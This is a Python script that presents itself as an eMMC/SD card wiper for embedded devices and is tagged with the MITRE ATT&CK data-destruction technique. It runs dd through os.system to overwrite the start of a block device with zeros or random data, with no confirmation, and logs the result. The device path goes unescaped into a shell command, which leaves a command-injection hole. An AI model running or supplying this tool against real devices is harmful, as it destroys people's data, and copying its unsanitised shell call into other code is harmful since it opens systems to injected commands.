#!/usr/bin/env python3

import os, argparse, json
from datetime import datetime

LOG_FILE = "results/emmc_wipe_log.json"
MITRE_TTP = "T1485"

def log_wipe(entry):
    os.makedirs("results", exist_ok=True)
    data = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE) as f:
            data = json.load(f)
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def wipe_device(dev="/dev/mmcblk0", zero=True):
    cmd = f"dd if=/dev/zero of={dev} bs=1M count=64" if zero else f"dd if=/dev/urandom of={dev} bs=1M count=64"
    return os.system(cmd) == 0

def main():
    parser = argparse.ArgumentParser(description="eMMC/SDCard Wiper for Embedded Devices")
    parser.add_argument("--dev", default="/dev/mmcblk0", help="Device path")
    parser.add_argument("--rand", action="store_true", help="Use /dev/urandom instead of zero")
    args = parser.parse_args()

    success = wipe_device(args.dev, not args.rand)
    log_wipe({
        "timestamp": datetime.utcnow().isoformat(),
        "device": args.dev,
        "method": "zero" if not args.rand else "urandom",
        "success": success,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    main()
